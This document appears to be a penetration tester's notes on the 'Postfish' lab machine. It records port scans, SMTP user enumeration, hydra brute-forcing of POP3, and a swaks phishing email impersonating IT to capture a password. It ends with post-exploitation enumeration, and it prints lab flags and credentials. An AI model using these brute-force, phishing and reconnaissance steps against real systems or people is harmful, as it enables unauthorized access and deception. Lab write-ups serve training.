**Metadata**

- IP Address:  192.168.148.137
- Hostname: postfish
- OS: 	Ubuntu 20.04.1 LTS
- Found Credentials/Users:
brian.moore / EternalSunshinE

Main Objectives:

Local.txt = f461a14a387422410744cb2e322f7c30
Proof.txt = a9d5de8c9bcf062cc8dd9f6df724b244

**Enumeration**

1. NMAP Scans (TCP/UDP)

```
[+] Running: Nmap BASIC TCP (top 1000)
[+] Command: nmap -sS -Pn -n --top-ports 1000 -T4 --open 192.168.148.137 -oN - 
# Nmap 7.95 scan initiated Wed Mar  4 14:09:59 2026 as: nmap -sS -Pn -n --top-ports 1000 -T4 --open -oN - 192.168.148.137
Nmap scan report for 192.168.148.137
Host is up (0.084s latency).
Not shown: 993 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
25/tcp  open  smtp
80/tcp  open  http
110/tcp open  pop3
143/tcp open  imap
993/tcp open  imaps
995/tcp open  pop3s

# Nmap done at Wed Mar  4 14:10:01 2026 -- 1 IP address (1 host up) scanned in 1.31 seconds
[+] Running: Nmap ALL TCP (all ports + versions)
[+] Command: nmap -sS -Pn -n -p- -T4 --open -sV --version-all 192.168.148.137 -oN /home/kali/ProvingGround/Postfish/nmap/full_tcp.nmap -oG /home/kali/ProvingGround/Postfish/nmap/full_tcp.gnmap 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-04 14:10 MST
Nmap scan report for 192.168.148.137
Host is up (0.081s latency).
Not shown: 65528 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
25/tcp  open  smtp     Postfix smtpd
80/tcp  open  http     Apache httpd 2.4.41 ((Ubuntu))
110/tcp open  pop3     Dovecot pop3d
143/tcp open  imap     Dovecot imapd (Ubuntu)
993/tcp open  ssl/imap Dovecot imapd (Ubuntu)
995/tcp open  ssl/pop3 Dovecot pop3d
Service Info: Host:  postfish.off; OS: Linux; CPE: cpe:/o:linux:linux_kernel



```

2. Interesting Ports/Services

```
[+] Open TCP ports (open only): 22, 25, 80, 110, 143, 993, 995
[+] Open UDP ports (open only): <none>
```

3. SSH Enumeration

```
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)

```

4. SMTP Enumeration

```
25/tcp  open  smtp     Postfix smtpd
|_ssl-date: TLS randomness does not represent time
|_smtp-commands: postfish.off, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2021-01-26T10:26:37
|_Not valid after:  2031-01-24T10:26:37

sudo nmap -p 25 --script smtp-commands 192.168.148.137 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-04 16:11 MST
Nmap scan report for postfish.off (192.168.148.137)
Host is up (0.077s latency).

PORT   STATE SERVICE
25/tcp open  smtp
|_smtp-commands: postfish.off, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING

Nmap done: 1 IP address (1 host up) scanned in 0.68 seconds

smtp-user-enum -M EXPN -U users -t 192.168.148.137
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... EXPN
Worker Processes ......... 5
Usernames file ........... users
Target count ............. 1
Username count ........... 17
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ 

######## Scan started at Wed Mar  4 16:14:08 2026 #########
######## Scan completed at Wed Mar  4 16:14:09 2026 #########
0 results.

17 queries in 1 seconds (17.0 queries / sec)

smtp-user-enum -M VRFY -U users -t 192.168.148.137
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... VRFY
Worker Processes ......... 5
Usernames file ........... users
Target count ............. 1
Username count ........... 19
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ 

######## Scan started at Wed Mar  4 16:18:18 2026 #########
192.168.148.137: mike.ross exists
192.168.148.137: claire.madison exists
192.168.148.137: brian.moore exists
192.168.148.137: sarah.lorem exists
192.168.148.137: root exists
######## Scan completed at Wed Mar  4 16:18:19 2026 #########
5 results.

19 queries in 1 seconds (19.0 queries / sec)

telnet 192.168.148.137 25
Trying 192.168.148.137...
Connected to 192.168.148.137.
Escape character is '^]'.
220 postfish.off ESMTP Postfix (Ubuntu)
EHLO postfish.off
250-postfish.off
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-STARTTLS
250-ENHANCEDSTATUSCODES
250-8BITMIME
250-DSN
250-SMTPUTF8
250 CHUNKING

```

5. Web Enumeration 

```
80/tcp  open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).

Webserver Info - 
Running Applications - 
Site Visit - 

whatweb -v http://target

[+] Running: Gobuster BASIC (80)
[+] Command: gobuster dir -u http://192.168.148.137:80 -w /usr/share/wordlists/dirb/common.txt -t 50 -o /home/kali/ProvingGround/Postfish/gobuster/Postfish_192.168.148.137_80_dir_basic.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.148.137:80
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 280]
/.htpasswd            (Status: 403) [Size: 280]
/.htaccess            (Status: 403) [Size: 280]
/index.html           (Status: 200) [Size: 83]
/server-status        (Status: 403) [Size: 280]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished

[+] Nikto scan on HTTP ports: 80
[+] Running: Nikto (80)
[+] Command: nikto -h http://192.168.148.137:80 -output /home/kali/ProvingGround/Postfish/web/192.168.148.137_80/nikto.txt -Format txt 
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.148.137
+ Target Hostname:    192.168.148.137
+ Target Port:        80
+ Start Time:         2026-03-04 14:51:11 (GMT-7)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /: Server may leak inodes via ETags, header found with file /, inode: 53, size: 5b9cb2d767fad, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ Apache/2.4.41 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ OPTIONS: Allowed HTTP Methods: GET, POST, OPTIONS, HEAD .
+ 8102 requests: 0 error(s) and 5 item(s) reported on remote host
+ End Time:           2026-03-04 15:02:57 (GMT-7) (706 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

curl -s http://postfish.off/team.html | html2markdown 

[__](javascript:void\(0\); "Toggle Navigation Menu")[Home](index.html) [Our
team](team.html)

# Meet Our Team

Get Started

![Jane](4.png)

## Claire Madison

HR Specialist

Motto: Treat everyone with kindness

Contact

![Mike](1.png)

## Mike Ross

IT Pro

Motto: Doing our duty every day at our best!

Contact

![John](2.png)

## Brian Moore

Sales Manager

Motto: Imagine typing slow

Contact

![talya](3.png)

## Sarah Lorem

Legal Advisor

Motto: My client is always right!

Contact

__

# Lorem Ipsum

##### Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod
tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam,
quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo
consequat.

Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor
incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis
nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.
Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia
deserunt mollit anim id est laborum consectetur adipiscing elit, sed do
eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim
veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea
commodo consequat.

# Quote of the day: live life

____________

Powered by [w3.css](https://www.w3schools.com/w3css/default.asp)


curl -i http://target

```

6. POP3 Port 110 Enumeration 

```
110/tcp open  pop3     Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: USER CAPA RESP-CODES SASL(PLAIN) STLS TOP PIPELINING AUTH-RESP-CODE UIDL
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2021-01-26T10:26:37
|_Not valid after:  2031-01-24T10:26:37

```

7. IMAP Port 143 Enumeration

```
143/tcp open  imap     Dovecot imapd (Ubuntu)
|_imap-capabilities: ID OK Pre-login IDLE more LITERAL+ listed ENABLE have post-login AUTH=PLAINA0001 SASL-IR STARTTLS IMAP4rev1 LOGIN-REFERRALS capabilities
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2021-01-26T10:26:37
|_Not valid after:  2031-01-24T10:26:37
        

```

8. IMAP SSL  993 Enumeration

```
993/tcp open  ssl/imap Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: ID OK Pre-login IDLE LITERAL+ listed ENABLE more post-login AUTH=PLAINA0001 SASL-IR have IMAP4rev1 LOGIN-REFERRALS capabilities
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2021-01-26T10:26:37
|_Not valid after:  2031-01-24T10:26:37

```

9. POP3 Port 995 Enumeration

```
995/tcp open  ssl/pop3 Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: RESP-CODES SASL(PLAIN) USER UIDL CAPA PIPELINING AUTH-RESP-CODE TOP
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2021-01-26T10:26:37
|_Not valid after:  2031-01-24T10:26:37


```

10. Possible Exploits

```

```

11. Other Notes

```

```

**Initial Foothold** 

1. Exploit Steps

- Found a list of users at http://postfish.off/team.html

![[Pasted image 20260306143048.png]]

- Used username_generator.py take the names and create usernames.
  
```
username_generator.py -w users2 > usernames
```

![[Pasted image 20260306143235.png]]

- Used smtp-user-enum to validate email accounts.

![[Pasted image 20260306143803.png]]

- Created a possible list of passwords using cewl.

```
cewl http://postfish.off/team.html --lowercase > passwords.txt

```

- Used hydra to brute force pop3 address. 

```
hydra -L usernames -P passwords.txt pop3://postfish.off 
```

![[Pasted image 20260306160046.png]]
- Logged into the POP3 account and listed emails.

![[Pasted image 20260306160156.png]]

- Looks like the users are expecting a email requesting they change passwords. Phishing opportunity. 

- Sent email with link and then setup listener of port 80.

```
swaks --from it@postfish.off --to brian.moore@postfish.off --server postfish.off:25 --header 'Subject: Password Reset' --body 'This is IT please got to the following link and change your password: http://192.168.45.215'

```

![[Pasted image 20260306160523.png]]

- Logged in with brian.moore and EternaLSunshinE.

![[Pasted image 20260306161004.png]]

2. Shell Upgrade

```
python3 -c 'import pty; pty.spawn("/bin/bash")'

python -c 'import pty; pty.spawn("/bin/bash")'

/usr/bin/script -qc /bin/bash /dev/null

export TERM=xterm

export SHELL=/bin/bash

Ctrl+Z

stty raw -echo; fg

reset
```

**Post-Exploitation**

1. Identify & System Info

```
brian.moore@postfish:~$ cat local.txt
f461a14a387422410744cb2e322f7c30
brian.moore@postfish:~$ whoami
brian.moore
brian.moore@postfish:~$ id
uid=1000(brian.moore) gid=1000(brian.moore) groups=1000(brian.moore),8(mail),997(filter)
brian.moore@postfish:~$ hostname
postfish
brian.moore@postfish:~$ pwd
/home/brian.moore
brian.moore@postfish:~$ uname -a
Linux postfish 5.4.0-64-generic #72-Ubuntu SMP Fri Jan 15 10:27:54 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
brian.moore@postfish:~$ cat /etc/os-release 2>/dev/null || cat /etc/issue 2>/dev/null
NAME="Ubuntu"
VERSION="20.04.1 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.1 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal


```

2. Environment

```
brian.moore@postfish:~$ env
SHELL=/bin/bash
PWD=/home/brian.moore
LOGNAME=brian.moore
XDG_SESSION_TYPE=tty
MOTD_SHOWN=pam
HOME=/home/brian.moore
LANG=en_US.UTF-8
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
SSH_CONNECTION=192.168.45.215 59904 192.168.148.137 22
LESSCLOSE=/usr/bin/lesspipe %s %s
XDG_SESSION_CLASS=user
TERM=xterm-256color
LESSOPEN=| /usr/bin/lesspipe %s
USER=brian.moore
SHLVL=1
XDG_SESSION_ID=145
XDG_RUNTIME_DIR=/run/user/1000
SSH_CLIENT=192.168.45.215 59904 22
XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
SSH_TTY=/dev/pts/0
_=/usr/bin/env
brian.moore@postfish:~$ set 2>/dev/null | head -n 50
BASH=/bin/bash
BASHOPTS=checkwinsize:cmdhist:complete_fullquote:expand_aliases:extglob:extquote:force_fignore:globasciiranges:histappend:interactive_comments:login_shell:progcomp:promptvars:sourcepath
BASH_ALIASES=()
BASH_ARGC=([0]="0")
BASH_ARGV=()
BASH_CMDS=()
BASH_COMPLETION_VERSINFO=([0]="2" [1]="10")
BASH_LINENO=()
BASH_SOURCE=()
BASH_VERSINFO=([0]="5" [1]="0" [2]="17" [3]="1" [4]="release" [5]="x86_64-pc-linux-gnu")
BASH_VERSION='5.0.17(1)-release'
COLUMNS=116
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
DIRSTACK=()
EUID=1000
GROUPS=()
HISTCONTROL=ignoreboth
HISTFILE=/home/brian.moore/.bash_history
HISTFILESIZE=2000
HISTSIZE=1000
HOME=/home/brian.moore
HOSTNAME=postfish
HOSTTYPE=x86_64
IFS=$' \t\n'
LANG=en_US.UTF-8
LESSCLOSE='/usr/bin/lesspipe %s %s'
LESSOPEN='| /usr/bin/lesspipe %s'
LINES=59
LOGNAME=brian.moore
LS_COLORS='rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:'
MACHTYPE=x86_64-pc-linux-gnu
MAILCHECK=60
MOTD_SHOWN=pam
OPTERR=1
OPTIND=1
OSTYPE=linux-gnu
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
PIPESTATUS=([0]="0")
PPID=179825
PS1='\[\e]0;\u@\h: \w\a\]${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
PS2='> '
PS4='+ '
PWD=/home/brian.moore
SHELL=/bin/bash
SHELLOPTS=braceexpand:emacs:hashall:histexpand:history:interactive-comments:monitor
SHLVL=1
SSH_CLIENT='192.168.45.215 59904 22'
SSH_CONNECTION='192.168.45.215 59904 192.168.148.137 22'
SSH_TTY=/dev/pts/0
TERM=xterm-256color
brian.moore@postfish:~$ echo "$PATH"
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
brian.moore@postfish:~$ echo "HOME=$HOME"; echo "SHELL=$SHELL"
HOME=/home/brian.moore
SHELL=/bin/bash


```

3. User & Home Directories

```
brian.moore@postfish:~$ cat /etc/passwd |grep /bin/bash
root:x:0:0:root:/root:/bin/bash
brian.moore:x:1000:1000::/home/brian.moore:/bin/bash
mike.ross:x:1001:1001::/home/mike.ross:/bin/bash
claire.madison:x:1002:1002::/home/claire.madison:/bin/bash
sarah.lorem:x:1003:1003::/home/sarah.lorem:/bin/bash

brian.moore@postfish:~$ ls -la /home
total 28
drwxr-xr-x  7 root           root           4096 Mar 31  2021 .
drwxr-xr-x 20 root           root           4096 Jan  7  2021 ..
drwxr-xr-x  3 brian.moore    brian.moore    4096 Mar  6 23:06 brian.moore
drwxr-xr-x  2 claire.madison claire.madison 4096 Jan 26  2021 claire.madison
drwxr-xr-x  2 mike.ross      mike.ross      4096 Jan 26  2021 mike.ross
drwxr-xr-x  3 sales          sales          4096 Mar  6 22:04 sales
drwxr-xr-x  2 sarah.lorem    sarah.lorem    4096 Jan 26  2021 sarah.lorem

brian.moore@postfish:~$ ls -la /root
ls: cannot open directory '/root': Permission denied

brian.moore@postfish:~$ sudo -l
[sudo] password for brian.moore: 
Sorry, user brian.moore may not run sudo on postfish.

brian.moore@postfish:~$ sudo -V 2>/dev/null | head -n 10
Sudo version 1.8.31
Sudoers policy plugin version 1.8.31
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.31

```

4. Writable Paths & Permissions

```
brian.moore@postfish:~$ find / -writable -type d 2>/dev/null | head -n 50
/tmp
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/.XIM-unix
/tmp/.X11-unix
/var/tmp
/var/mail
/var/crash
/run/user/1000
/run/user/1000/gnupg
/run/user/1000/systemd
/run/user/1000/systemd/units
/run/screen
/run/lock
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/dbus.socket
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/init.scope
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/dbus.socket
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope
/dev/mqueue
/dev/shm
/home/brian.moore
/home/brian.moore/.cache
/proc/180234/task/180234/fd
/proc/180234/fd
/proc/180234/map_files

brian.moore@postfish:~$ find / -writable -type f 2>/dev/null | head -n 50
/etc/postfix/disclaimer
/var/mail/brian.moore
/sys/kernel/security/apparmor/.remove
/sys/kernel/security/apparmor/.replace
/sys/kernel/security/apparmor/.load
/sys/kernel/security/apparmor/attr/exec
/sys/kernel/security/apparmor/attr/current
/sys/kernel/security/apparmor/.access
/sys/fs/cgroup/memory/user.slice/cgroup.event_control
/sys/fs/cgroup/memory/user.slice/user-1000.slice/user@1000.service/cgroup.event_control
/sys/fs/cgroup/memory/user.slice/user-1000.slice/cgroup.event_control
/sys/fs/cgroup/memory/user.slice/user-1000.slice/session-145.scope/cgroup.event_control
/sys/fs/cgroup/memory/cgroup.event_control
/sys/fs/cgroup/memory/init.scope/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/systemd-update-utmp.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/systemd-sysusers.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/apache2.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/iscsid.socket/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/systemd-udevd-control.socket/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/lvm2-monitor.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/systemd-journal-flush.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/open-vm-tools.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/systemd-sysctl.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/systemd-networkd.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/snapd.apparmor.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/systemd-udevd.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/systemd-udevd-kernel.socket/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/finalrd.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/cron.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/sys-fs-fuse-connections.mount/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/sys-kernel-config.mount/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/polkit.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/systemd-remount-fs.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/networkd-dispatcher.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/sys-kernel-debug.mount/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/lvm2-lvmpolld.socket/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/multipathd.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/accounts-daemon.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/systemd-tmpfiles-setup.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/-.mount/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/system-modprobe.slice/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/systemd-journald-dev-log.socket/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/cloud-init-local.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/systemd-networkd.socket/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/console-setup.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/snap-lxd-19647.mount/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/systemd-journald.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/atd.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/snap-core18-1997.mount/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/systemd-udev-trigger.service/cgroup.event_control

echo "$PATH" | tr ':' '\n' | while read -r p; do [ -z "$p" ] && continue; if [ -w "$p" ]; then echo "WRITABLE: $p"; else echo "OK: $p"; fi; done
OK: /usr/local/sbin
OK: /usr/local/bin
OK: /usr/sbin
OK: /usr/bin
OK: /sbin
OK: /bin
OK: /usr/games
OK: /usr/local/games
OK: /snap/bin


find / -user "$(id -un)" -type f 2>/dev/null | head -n 50
/var/mail/brian.moore
/home/brian.moore/.cache/motd.legal-displayed
/home/brian.moore/local.txt
/home/brian.moore/.bash_logout
/home/brian.moore/.bashrc
/home/brian.moore/.profile
/proc/179718/task/179718/fdinfo/0
/proc/179718/task/179718/fdinfo/1

brian.moore@postfish:~$ ls -l /etc/passwd 2>/dev/null
-rw-r--r-- 1 root root 2332 Mar 31  2021 /etc/passwd

brian.moore@postfish:~$ ls -l /etc/shadow 2>/dev/null
-rw-r----- 1 root shadow 1551 Mar 31  2021 /etc/shadow

ls -la / 2>/dev/null
brian.moore@postfish:~$ ls -la / 2>/dev/null
total 1994832
drwxr-xr-x  20 root root       4096 Jan  7  2021 .
drwxr-xr-x  20 root root       4096 Jan  7  2021 ..
lrwxrwxrwx   1 root root          7 Jul 31  2020 bin -> usr/bin
drwxr-xr-x   3 root root       4096 Mar  6 21:43 boot
drwxr-xr-x   2 root root       4096 Jan  7  2021 cdrom
drwxr-xr-x  18 root root       4020 Mar  6 21:26 dev
drwxr-xr-x 100 root root       4096 Mar  6 21:45 etc
drwxr-xr-x   7 root root       4096 Mar 31  2021 home
lrwxrwxrwx   1 root root          7 Jul 31  2020 lib -> usr/lib
lrwxrwxrwx   1 root root          9 Jul 31  2020 lib32 -> usr/lib32
lrwxrwxrwx   1 root root          9 Jul 31  2020 lib64 -> usr/lib64
lrwxrwxrwx   1 root root         10 Jul 31  2020 libx32 -> usr/libx32
drwx------   2 root root      16384 Jan  7  2021 lost+found
drwxr-xr-x   2 root root       4096 Jul 31  2020 media
drwxr-xr-x   2 root root       4096 Jul 31  2020 mnt
drwxr-xr-x   2 root root       4096 Jul 31  2020 opt
dr-xr-xr-x 216 root root          0 Aug  3  2024 proc
drwx------   3 root root       4096 Mar  6 21:20 root
drwxr-xr-x  30 root root        980 Mar  6 23:06 run
lrwxrwxrwx   1 root root          8 Jul 31  2020 sbin -> usr/sbin
